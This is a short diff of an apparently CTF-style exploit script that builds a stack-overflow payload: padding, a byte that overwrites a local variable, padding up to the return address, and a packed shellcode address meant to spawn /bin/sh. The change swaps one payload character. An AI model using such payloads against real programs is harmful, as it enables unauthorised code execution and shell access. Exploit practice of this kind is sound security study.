@@ -29,7 +29,7 @@ def exploit(target):
     log.info("Shellcode addr: {}".format(hex(shellcode_addr)))
 
     payload = "A" * first_padding
-    payload += '+' #after the first padding, we need to overwrite v5 again, the input is free
+    payload += '*' #after the first padding, we need to overwrite v5 again, the input is free
     payload += "A" * second_padding #padding for overwriting return address
     payload += p64(shellcode_addr) #shellcode address for executing /bin/sh
 
